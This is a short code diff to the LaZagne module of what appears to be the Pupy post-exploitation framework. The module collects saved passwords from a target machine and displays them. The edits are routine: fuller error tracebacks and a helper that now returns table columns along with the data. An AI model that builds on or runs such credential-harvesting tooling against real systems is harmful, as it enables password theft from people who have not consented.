@@ -91,7 +91,8 @@ class LaZagne(PupyModule):
                 try:
                     self.print_results(r[0], r[1], r[2], db)
                 except Exception, e:
-                    self.error('{}: {}'.format(r[1], e))
+                    import traceback
+                    self.error('{}: {}: {}'.format(r[1], e, traceback.format_exc()))
 
         if not passwordsFound:
             self.warning('no passwords found !')
@@ -174,7 +175,7 @@ class LaZagne(PupyModule):
                     result[c] = cred[c].strip()
 
                     for t, name in self.TYPESMAP.iteritems():
-                        if t in set(x.lower() for x in result):
+                        if t in set([x.lower() for x in result]):
                             result['CredType'] = name
 
                     if not result.get('CredType'):
@@ -188,12 +189,20 @@ class LaZagne(PupyModule):
         if not items:
             return []
 
-        return [
+        data = [
             {
                 self.try_utf8(k):self.try_utf8(v)
                 for k,v in item.iteritems() if k not in remove
             } for item in items
         ]
+
+        columns = set()
+        for item in items:
+            for column in item:
+                if not column in remove:
+                    columns.add(column)
+
+        return data, columns
 
     def try_utf8(self, value):
         if type(value) == unicode:
@@ -240,7 +249,7 @@ class LaZagne(PupyModule):
         else:
             if module not in self.NON_TABLE:
                 self.table(
-                    self.prepare_fields(
+                    *self.prepare_fields(
                         creds, remove=self.FILTER_COLUMNS))
             else:
                 for cred in creds:
